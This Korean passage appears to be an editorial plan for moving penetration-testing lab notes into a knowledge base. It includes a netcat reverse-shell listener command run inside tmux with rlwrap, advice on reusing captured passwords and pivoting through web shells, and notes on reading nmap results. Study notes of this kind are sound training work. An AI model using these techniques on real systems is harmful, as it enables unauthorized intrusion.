> 이 값의 진짜 가치는 패스워드 재사용 쪽이다 — 얻은 비밀번호로 SSH·다른 서비스를 다시 시도한다. (이 박스는 빈 문자열이라 무의미)

> 13. **DB 자격증명을 얻어도 원격에서 못 쓸 수 있다.** nmap의 `MySQL (unauthorized)`가 그 예고편이다. 호스트 제한이 걸렸으면 SSH 포트포워딩이나 이미 확보한 웹셸을 경유한다. 그리고 얻은 비밀번호는 다른 서비스에 재사용부터 시도한다.

(⚠️ `[가정]` 과 `db_host_name` 구분은 **노트 `Post-Exploitation` 절에 그대로 남겼다.** 이관은 일반화 쪽이다.)

---

## 제안 19 — 신규 `B-?` : `tmux` + `rlwrap` 리스너 습관

**② 신규 또는 B-8 절 병합** — 이미 동등 항목이 있으면 건너뛸 것.

**③ 넣을 본문**

````markdown
```bash
tmux new-session -d -s <이름> 'rlwrap nc -lvnp 4444'
```

- `tmux new-session -d -s <이름> '<명령>'` — `-d`(detached)로 백그라운드 실행. **비대화형 SSH 로 몰 때 셸이 안 끊김.** 터미널을 닫아도 리스너가 삶
- `rlwrap` — readline 래핑. 방향키·↑히스토리·백스페이스가 raw 리버스셸에서도 동작함. 없으면 오타 하나에 명령을 통째로 다시 쳐야 함
- `nc -lvnp 4444` — `l`isten · `v`erbose · `n`o-DNS · `p`ort. **`-n` 을 빼면 역방향 DNS 조회로 접속 표시가 수 초 지연됨**
````

**④ 지우기 전 원문** (원본 3-2)

> 리스너를 tmux 세션으로 띄운다 (비대화식 SSH로 몰 때 셸이 안 끊긴다):
> …
> 이 한 줄은 습관으로 굳혀둘 만하다.
>
> - `tmux new-session -d -s <이름> '<명령>'` — `-d`(detached)로 백그라운드 실행. 터미널을 닫아도 리스너가 산다
> - `rlwrap` — readline 래핑. 방향키·↑히스토리·백스페이스가 raw 리버스셸에서도 동작한다. 없으면 오타 하나에 명령을 통째로 다시 쳐야 한다
> - `nc -lvnp 4444` — `l`isten · `v`erbose · `n`o-DNS · `p`ort. `-n`을 빼면 역방향 DNS 조회로 접속 표시가 수 초 지연된다

---

## 제안 20 — 신규 `B-?` : RST(`closed`)는 「방화벽 없음」의 증거가 아니다

**② 신규 또는 `A-1-17. nmap 이 filtered 라고 적은 포트를 버렸다` 병합** — 같은 주제의 반대 방향이라 병합이 나을 수 있음. 반영자 판단.

**③ 넣을 본문**

```markdown
`Not shown: 65531 closed tcp ports (reset)` 에서 **확정되는 것은 둘뿐이다:**
① 묵살형 인라인 차단이 없음 ② 숨은 고번호 포트가 없음

**「방화벽이 없다」의 증거는 아님** — `iptables -j REJECT --reject-with tcp-reset`, 방화벽 장비의 reject 정책, 클라우드 보안그룹이 **전부 RST 를 돌려줌.** RST 와 `filtered` 의 차이는 **차단 «방식»이지 차단 «유무»가 아님.**

**출처** — [[Crane]]. 대조 — [[Hawat]](웹이 50080 에 숨어 있어 `-p-` 가 필수였던 경우).
```

**④ 지우기 전 원문** (원본 1장 nmap 해설표 첫 행)

> | `Not shown: 65531 closed tcp ports (reset)` | 필터링(DROP)이 아니라 RST 응답이다. 확정되는 것은 ① 묵살형 인라인 차단이 없다 ② 숨은 고번호 포트가 없다 두 가지뿐 ([[Hawat]]처럼 웹이 50080에 숨은 경우와 대조). **"방화벽이 없다"의 증거는 아니다** — `iptables -j REJECT --reject-with tcp-reset`, 방화벽 장비의 reject 정책, 클라우드 보안그룹 전부 RST를 돌려준다. RST와 `filtered`의 차이는 차단 방식이지 차단 유무가 아니다 |

(⚠️ 이 서술은 **노트 `Service Enumeration` 절에도 남겼다** — 실측 nmap 출력의 해설이다.)

---

## 검산

**실제로 세었다** — 원본에서 통째로 제거된 하위 단위와 제안의 대응.

| 원본 하위 단위 | 대응 제안 |
|---|---|
| 0장 「배우는 것」 5불릿 | 10 · 11 · 12 · 2 (각 기법 카드로 흡수) |
| 0장 「시험 출제 가능성」 | 10 (변형 예상은 B-1-37·B-1-29 인접) |
| 1장 nmap 플래그 표 | 16 |
| 1장 RST 해설 행 | 20 |
| 1장 `get_server_info` 파라미터 반증 | 12 |
| 1장 검색 순서 5단계 | 1 |
| 1장 feroxbuster 착시 3불릿 | 2 |
| 1장 `config.php` 반사 | 6 |
| 2-1 전량 | 10 |
| 2-2 8단계 표 · 신뢰경계 · post-auth 권한 | 10 |
| 2-3 체인 표 · 3겹 표 · 리버스셸 조각 표 | 10 · 3 |
| 2-3 `/dev/tcp` dash 콜아웃(Kali 실측) | 3 |
| 2-4 전량 | 10 · 8 |
| 3-1 로그인 판정 서술 | 13 · 2 |
| 3-2 tmux/rlwrap/nc 해설 | 19 |
| 3-2 base64 `-n`/`-w0` | 14 |
| 3-2 PoC 허용 판정 | 15 |
| 3-2 TTY 3단 세트 | 4 |
| 4-1 5개 루틴 | 16 |
| 4-2 `env -i` 비교 · GTFOBins 일반화 목록 | 11 |
| 4-3 DB 원격 불가 일반화 | 18 |
| 5장 find 반사 · 증거 습관 | 7 · 16 |
| 6장 ① | 1 |
| 6장 ② | 2 |
| 6장 ③ | 6 |
| 6장 ④ | 7 |
| 6장 ⑤ | 3 |
| 6장 ⑥ | 8 |
| 6장 ⑦ | 5 |
| 6장 ⑧ | 4 · 5 |
| 6장 ⑨ | 9 |
| 6장 ⑩ | 17 |
| 7장 1~13 + 반사 체크 | 1·2·6·7·11·13·14·15·16·18 로 분산 |
| 8장 방어 관점 9행 | **이관 아님 — 노트의 두 `Vulnerability Fix:` 로 분산 흡수** |
| 9장 참고 자료 | **이관 아님 — 노트 `## 관련` 유지** |

**하위 단위 34개 → 제안 20건.** 1:1 이 아닌 이유는 ① 6장 ⑧ 이 제안 4·5 **둘로** 갈렸고 ② 7장 13항목이 10개 제안에 분산됐으며 ③ 2-1·2-3·2-4 세 절이 제안 10 **하나로** 합쳐졌기 때문이다. 8장·9장 두 단위는 이관 대상이 아니다.

## 반영자 확인 사항

1. **제안 10 은 분량이 크다.** `B-1` 절 안에서 한 카드로 두는 것이 맞는지, 「PHP 역직렬화 개론」과 「Monolog/RCE2 해부」로 쪼갤지 판단할 것
2. **제안 20 은 `A-1-17` 과 병합이 나을 수 있다** — 같은 주제(nmap 포트 상태 읽기)의 반대 방향
3. **제안 16·19 는 기존 `C-1`·`C-2`·`B-8` 에 동등 항목이 이미 있을 수 있다.** 중복이면 건너뛸 것
4. **번호 배정 후 노트 앵커를 갱신할 필요는 없다** — 노트에는 **신규 제안 앵커를 하나도 걸지 않았다.** 기존 절 앵커 8건만 걸었고 전부 실재를 확인했다:
   `A-12` · `A-1-11` · `A-14` · `A-31` · `A-38` · `B-1-29` · `B-1-37` · `B-81`
